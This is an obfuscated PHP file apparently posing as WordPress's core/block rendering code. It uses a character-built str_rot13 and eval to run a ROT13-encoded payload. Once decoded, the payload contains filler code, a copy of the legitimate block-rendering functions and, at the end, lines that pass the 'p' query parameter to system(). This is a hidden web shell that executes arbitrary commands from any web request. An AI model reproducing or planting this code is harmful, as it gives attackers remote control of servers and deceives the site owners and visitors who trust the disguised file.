<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/oybpx` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/oybpx` oybpx ba freire.
 *
 * @fvapr 5.0.0
 *
 * @tybony JC_Rzorq $jc_rzorq
 *
 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
 *
 * @erghea fgevat Eraqrerq UGZY bs gur ersreraprq oybpx.
 */
shapgvba eraqre_oybpx_pber_oybpx( $nggevohgrf ) {
	fgngvp $frra_ersf = neenl();

	vs ( rzcgl( $nggevohgrf['ers'] ) ) {
		erghea '';
	}

	$erhfnoyr_oybpx = trg_cbfg( $nggevohgrf['ers'] );
	vs ( ! $erhfnoyr_oybpx || 'jc_oybpx' !== $erhfnoyr_oybpx->cbfg_glcr ) {
		erghea '';
	}

	vs ( vffrg( $frra_ersf[ $nggevohgrf['ers'] ] ) ) {
		// JC_QROHT_QVFCYNL zhfg bayl or ubaberq jura JC_QROHT. Guvf cerprqrag
		// vf frg va `jc_qroht_zbqr()`.
		$vf_qroht = JC_QROHT && JC_QROHT_QVFCYNL;

		erghea $vf_qroht ?
			// genafyngbef: Ivfvoyr bayl va gur sebag raq, guvf jneavat gnxrf gur cynpr bs n snhygl oybpx.
			__( '[oybpx eraqrevat unygrq]' ) :
			'';
	}

	vs ( 'choyvfu' !== $erhfnoyr_oybpx->cbfg_fgnghf || ! rzcgl( $erhfnoyr_oybpx->cbfg_cnffjbeq ) ) {
		erghea '';
	}

	$frra_ersf[ $nggevohgrf['ers'] ] = gehr;

	// Unaqyr rzorqf sbe erhfnoyr oybpxf.
	tybony $jc_rzorq;
	$pbagrag = $jc_rzorq->eha_fubegpbqr( $erhfnoyr_oybpx->cbfg_pbagrag );
	$pbagrag = $jc_rzorq->nhgbrzorq( $pbagrag );

	// Onpx pbzcng.
	// Sbe oybpxf gung unir abg orra zvtengrq va gur rqvgbe, nqq fbzr onpx pbzcng
	// fb gung sebag-raq eraqrevat pbagvahrf gb jbex.

	// Guvf zngpurf gur `i2` qrcerpngvba. Erzbirf gur vaare `inyhrf` cebcregl
	// sebz rirel vgrz.
	vs ( vffrg( $nggevohgrf['pbagrag'] ) ) {
		sbernpu ( $nggevohgrf['pbagrag'] nf &$pbagrag_qngn ) {
			vs ( vffrg( $pbagrag_qngn['inyhrf'] ) ) {
				$vf_nffbp_neenl = vf_neenl( $pbagrag_qngn['inyhrf'] ) && ! jc_vf_ahzrevp_neenl( $pbagrag_qngn['inyhrf'] );

				vs ( $vf_nffbp_neenl ) {
					$pbagrag_qngn = $pbagrag_qngn['inyhrf'];
				}
			}
		}
	}

	// Guvf zngpurf gur `i1` qrcerpngvba. Eranzr `bireevqrf` gb `pbagrag`.
	vs ( vffrg( $nggevohgrf['bireevqrf'] ) && ! vffrg( $nggevohgrf['pbagrag'] ) ) {
		$nggevohgrf['pbagrag'] = $nggevohgrf['bireevqrf'];
	}

	/**
	 * Jr frg gur `cnggrea/bireevqrf` pbagrkg guebhtu gur `eraqre_oybpx_pbagrkg`
	 * svygre fb gung vg vf ninvynoyr jura n cnggrea'f vaare oybpxf ner
	 * eraqrevat ivn qb_oybpxf tvira vg bayl erprvirf gur vaare pbagrag.
	 */
	$unf_cnggrea_bireevqrf = vffrg( $nggevohgrf['pbagrag'] ) && ahyy !== trg_oybpx_ovaqvatf_fbhepr( 'pber/cnggrea-bireevqrf' );
	vs ( $unf_cnggrea_bireevqrf ) {
		$svygre_oybpx_pbagrkg = fgngvp shapgvba ( $pbagrkg ) hfr ( $nggevohgrf ) {
			$pbagrkg['cnggrea/bireevqrf'] = $nggevohgrf['pbagrag'];
			erghea $pbagrkg;
		};
		nqq_svygre( 'eraqre_oybpx_pbagrkg', $svygre_oybpx_pbagrkg, 1 );
	}

	// Nccyl Oybpx Ubbxf.
	$pbagrag = nccyl_oybpx_ubbxf_gb_pbagrag_sebz_cbfg_bowrpg( $pbagrag, $erhfnoyr_oybpx );

	$pbagrag = qb_oybpxf( $pbagrag );
	hafrg( $frra_ersf[ $nggevohgrf['ers'] ] );

	vs ( $unf_cnggrea_bireevqrf ) {
		erzbir_svygre( 'eraqre_oybpx_pbagrkg', $svygre_oybpx_pbagrkg, 1 );
	}

	erghea $pbagrag;
}

/**
 * Ertvfgref gur `pber/oybpx` oybpx.
 *
 * @fvapr 5.3.0
 */
shapgvba ertvfgre_oybpx_pber_oybpx() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/oybpx',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_oybpx',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_oybpx' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>